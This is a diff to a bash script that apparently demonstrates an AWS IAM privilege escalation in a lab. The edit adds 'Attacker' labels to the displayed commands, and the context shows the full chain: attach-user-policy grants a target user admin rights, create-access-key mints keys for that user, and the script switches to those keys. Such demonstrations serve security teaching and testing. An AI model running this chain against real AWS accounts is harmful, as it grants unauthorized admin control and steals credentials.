@@ -24,12 +24,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -92,7 +94,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -104,7 +106,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -112,7 +114,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify starting user lacks admin access
 echo -e "${YELLOW}Step 4: Verifying starting user lacks admin access${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -123,11 +125,11 @@ echo ""
 # Step 5: Verify target user's current permissions
 echo -e "${YELLOW}Step 5: Checking target user's current permissions${NC}"
 echo "Getting target user details: $TARGET_USER_NAME"
-show_cmd "aws iam get-user --user-name $TARGET_USER_NAME --query 'User.[UserName,Arn]' --output table"
+show_cmd "Attacker" "aws iam get-user --user-name $TARGET_USER_NAME --query 'User.[UserName,Arn]' --output table"
 aws iam get-user --user-name $TARGET_USER_NAME --query 'User.[UserName,Arn]' --output table
 
 echo "Listing target user's current attached managed policies:"
-show_cmd "aws iam list-attached-user-policies --user-name $TARGET_USER_NAME --query 'AttachedPolicies[*].PolicyName' --output text"
+show_cmd "Attacker" "aws iam list-attached-user-policies --user-name $TARGET_USER_NAME --query 'AttachedPolicies[*].PolicyName' --output text"
 CURRENT_POLICIES=$(aws iam list-attached-user-policies --user-name $TARGET_USER_NAME --query 'AttachedPolicies[*].PolicyName' --output text)
 if [ -z "$CURRENT_POLICIES" ]; then
     echo "Current attached policies: (none)"
@@ -142,7 +144,7 @@ echo "This is the privilege escalation vector..."
 echo "Attaching policy: $ADMIN_POLICY_ARN"
 echo "To user: $TARGET_USER_NAME"
 
-show_attack_cmd "aws iam attach-user-policy --user-name $TARGET_USER_NAME --policy-arn $ADMIN_POLICY_ARN"
+show_attack_cmd "Attacker" "aws iam attach-user-policy --user-name $TARGET_USER_NAME --policy-arn $ADMIN_POLICY_ARN"
 aws iam attach-user-policy \
     --user-name $TARGET_USER_NAME \
     --policy-arn $ADMIN_POLICY_ARN
@@ -158,7 +160,7 @@ echo -e "${GREEN}✓ Policy propagated${NC}\n"
 echo -e "${YELLOW}Step 7: Creating access keys for target user${NC}"
 echo "Creating access keys for: $TARGET_USER_NAME"
 
-show_attack_cmd "aws iam create-access-key --user-name $TARGET_USER_NAME --output json"
+show_attack_cmd "Attacker" "aws iam create-access-key --user-name $TARGET_USER_NAME --output json"
 KEY_OUTPUT=$(aws iam create-access-key --user-name $TARGET_USER_NAME --output json)
 NEW_ACCESS_KEY=$(echo $KEY_OUTPUT | jq -r '.AccessKey.AccessKeyId')
 NEW_SECRET_KEY=$(echo $KEY_OUTPUT | jq -r '.AccessKey.SecretAccessKey')
@@ -179,7 +181,7 @@ export AWS_SECRET_ACCESS_KEY=$NEW_SECRET_KEY
 export AWS_REGION=$AWS_REGION
 
 # Verify new identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 TARGET_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $TARGET_IDENTITY"
 echo -e "${GREEN}✓ Now using target user credentials${NC}\n"
@@ -188,7 +190,7 @@ echo -e "${GREEN}✓ Now using target user credentials${NC}\n"
 echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
-show_cmd "aws iam list-users --max-items 3 --output table"
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
